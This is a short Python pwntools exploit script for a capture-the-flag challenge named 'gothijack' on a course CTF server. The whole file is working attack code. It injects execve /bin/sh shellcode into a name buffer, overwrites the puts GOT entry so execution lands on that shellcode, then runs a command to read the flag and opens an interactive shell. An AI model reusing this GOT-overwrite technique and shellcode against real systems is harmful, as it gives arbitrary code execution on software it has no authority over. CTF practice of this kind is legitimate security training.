#!/usr/bin/env python
from pwn import *

#m = process('./gothijack')
host, port = 'csie.ctf.tw', 10129
m = remote(host,port)

# . there is no DEP on the stack
# . so we can put our shellcode in name buffer
# . when we return to the name[] then we can execute the shellcode

puts_got = '0x601020'
username = 0x6010a1
sh = '\x00\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05\n'

m.recvuntil('name :')
m.send(sh)
m.recvuntil('write :')
m.sendline(puts_got)
m.recvuntil('data :')
m.sendline(p64(username))
sleep(1)
m.sendline('cat /home/`whoami`/flag')
m.interactive()
